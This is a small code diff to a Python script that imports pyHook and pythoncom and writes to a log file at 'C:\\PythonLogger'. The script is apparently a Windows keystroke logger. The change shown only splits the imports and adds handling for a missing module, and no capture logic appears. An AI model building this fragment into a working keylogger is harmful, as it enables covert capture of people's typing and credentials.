@@ -1,4 +1,12 @@
-import pyHook, pythoncom, sys, logging
+import sys
+import logging
+
+try:
+	import pyHook
+	import pythoncom
+except ImportError:
+	print("The module %s couldn't be found" % (sys.exc_info()[1].message.split()[-1]))
+	sys.exit(1)
 
 file_log = 'C:\\PythonLogger'
 
